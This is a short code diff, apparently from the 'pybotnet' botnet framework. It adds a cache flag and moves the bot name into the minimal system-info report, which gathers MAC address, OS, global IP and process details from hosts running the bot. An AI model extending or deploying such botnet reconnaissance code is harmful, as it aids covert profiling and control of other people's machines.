@@ -168,11 +168,13 @@ Docs: {__github_link__}
         if minimal:
             is_cache, data = self._get_cache("minimal_system_info")
             if is_cache:
+                data.update({"from cache": True})
                 return data
         # return cache full if exist
         else:
             is_cache, data = self._get_cache("full_system_info")
             if is_cache:
+                data.update({"from cache": True})
                 return data
 
         minimal_info = {
@@ -180,6 +182,7 @@ Docs: {__github_link__}
             "mac_addres": uuid.getnode(),
             "os": platform.system(),
             "global_ip": get_global_ip(),
+            "bot_name": self.BOT_NAME,
         }
 
         if minimal:
@@ -205,7 +208,6 @@ Docs: {__github_link__}
             "pid": os.getpid(),
             "cpu_count": os.cpu_count(),
             "pybotnet_version": __version__,
-            "bot_name": self.BOT_NAME,
         }
 
         # save cache full
